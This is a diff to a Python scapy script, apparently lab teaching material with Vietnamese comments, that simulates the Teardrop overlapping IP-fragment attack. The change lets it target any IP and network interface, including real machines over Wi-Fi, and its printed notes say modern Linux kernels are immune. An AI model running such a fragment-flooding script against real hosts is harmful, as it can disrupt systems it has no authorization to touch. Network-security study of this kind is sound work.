@@ -1,11 +1,17 @@
 #!/usr/bin/env python3
 # teardrop_attack.py - Mo phong tan cong phan manh IP chong lan (Teardrop Attack)
+# Ho tro: Ban manh IP truc tiep qua Wi-Fi toi may that hoac namespace
 import sys
 import time
 from scapy.all import *
 
-victim_ip = "10.0.0.2"
-ipid = 1234  # Identification dung de kernel ben nhan biet cac manh cung mot goi
+victim_ip = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.2"
+try:
+    auto_iface = conf.route.route(victim_ip)[0]
+except Exception:
+    auto_iface = conf.iface or "eth0"
+iface     = sys.argv[2] if len(sys.argv) > 2 and sys.argv[2] != "auto" else auto_iface
+ipid      = 1234  # Identification dung de kernel ben nhan biet cac manh cung mot goi
 
 print("==================================================================")
 print("[*] TAN CONG TEARDROP ATTACK (OVERLAPPING IP FRAGMENTS)")
@@ -13,6 +19,8 @@ print("==================================================================")
 print(f"[*] Muc tieu nan nhan (Victim):       {victim_ip}")
 print(f"[*] IP Identification (ID goi):       {ipid}")
 print(f"[*] Giao thuc mang theo (Protocol):    17 (UDP)")
+if iface:
+    print(f"[*] Card mang su dung:                {iface}")
 print("==================================================================")
 
 # 1. Manh 1 (Fragment 1):
@@ -35,9 +43,13 @@ print("    ==> Vung chong lan (Overlap): Byte 8 den Byte 23 (16 byte bi de len n
 print("==================================================================")
 
 print(f"[*] Dang ban 2 manh IP chong lan toi {victim_ip}...")
-send([f1, f2], verbose=0)
+if iface:
+    send([f1, f2], iface=iface, verbose=0)
+else:
+    send([f1, f2], verbose=0)
 
 print("[+] DA GUI THANH CONG!")
-print("    -> Hay kiem tra thong ke ReasmFails tai Victim: cat /proc/net/snmp | grep -A1 '^Ip:'")
-print("    -> Kiem tra xem Victim co bi crash khong (Kernel hien dai se mien nhiem 100%).")
-
+print(f"    -> Hay kiem tra thong ke ReasmFails tai Victim ({victim_ip}):")
+print("       netstat -s | grep -i -E 'reassembl|fragments'")
+print("       (hoac: cat /proc/net/snmp | grep -A1 '^Ip:')")
+print("    -> Kiem tra xem Victim co bi crash khong (Kernel Linux hien dai mien nhiem 100%).")
